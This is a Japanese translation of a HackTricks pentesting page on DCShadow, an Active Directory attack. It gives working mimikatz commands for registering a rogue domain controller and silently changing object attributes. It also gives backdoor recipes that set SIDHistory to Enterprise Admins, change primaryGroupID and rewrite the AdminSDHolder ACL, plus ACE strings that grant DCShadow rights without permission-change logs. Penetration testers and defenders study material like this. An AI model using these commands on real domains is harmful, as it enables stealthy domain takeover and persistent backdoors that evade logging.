<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


# DCShadow

これは、ADに**新しいドメインコントローラ**を登録し、指定されたオブジェクトに対して**属性**（SIDHistory、SPNなど）を**ログを残さずに**追加するために使用されます。**DA権限**が必要で、**ルートドメイン**内にいる必要があります。\
間違ったデータを使用すると、かなり醜いログが表示されます。

攻撃を実行するには、2つのmimikatzインスタンスが必要です。そのうちの1つは、SYSTEM特権でRPCサーバーを起動します（ここで行いたい変更を指定する必要があります）。もう1つのインスタンスは、値を追加するために使用されます：

{% code title="mimikatz1（RPCサーバー）" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2（プッシュ）- DAまたは同等の権限が必要" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**注意**：mimikatz1セッションでは**`elevate::token`**は機能しません。なぜなら、それはスレッドの特権を昇格させるものであり、プロセスの特権を昇格させる必要があるからです。\
また、"LDAP"オブジェクトを選択することもできます：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

これらの変更を行うためには、DAからまたは次の最小限の権限を持つユーザーから変更をプッシュすることができます：

* **ドメインオブジェクト**：
* _DS-Install-Replica_（ドメインのレプリカの追加/削除）
* _DS-Replication-Manage-Topology_（レプリケーショントポロジの管理）
* _DS-Replication-Synchronize_（レプリケーションの同期）
* **構成コンテナ**の**サイトオブジェクト**（およびその子）：
* _CreateChild and DeleteChild_
* **DCとして登録されているコンピュータのオブジェクト**：
* _WriteProperty_（Writeではない）
* **ターゲットオブジェクト**：
* _WriteProperty_（Writeではない）

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)を使用して、特権のないユーザーにこれらの特権を与えることができます（これにより一部のログが残ります）。これはDA特権を持つよりもはるかに制限されたものです。\
例：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、ユーザー名_**student1**_がマシン_**mcorp-student1**_にログインした場合、オブジェクト_**root1user**_に対してDCShadow権限を持つことを意味します。

## DCShadowを使用してバックドアを作成する

{% code title="SIDHistoryにEnterprise Adminsを設定する" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="プライマリグループIDの変更（ユーザーをドメイン管理者のメンバーに設定する）" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="AdminSDHolderのntSecurityDescriptorを変更する（ユーザーに完全な制御権を与える）" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## シャドウセプション - DCShadowを使用してDCShadowの権限を付与する（変更された権限ログなし）

次のACEをドメインオブジェクトの末尾にユーザーのSIDとともに追加する必要があります：

* ドメインオブジェクト上：
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 攻撃者のコンピュータオブジェクト上：`(A;;WP;;;UserSID)`
* ターゲットユーザーオブジェクト上：`(A;;WP;;;UserSID)`
* 構成コンテナ内のサイトオブジェクト：`(A;CI;CCDC;;;UserSID)`

オブジェクトの現在のACEを取得するには：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

この場合、**複数の変更**を行う必要があるため、**mimikatz1セッション**（RPCサーバー）でパラメータ**`/stack`を使用して各変更**を行う必要があります。これにより、ローグサーバーでスタックされた変更をすべて実行するために、**`/push`**を1回だけ実行するだけで済みます。



[**ired.teamのDCShadowに関する詳細情報**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション

- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう

- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私を**フォロー**する[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
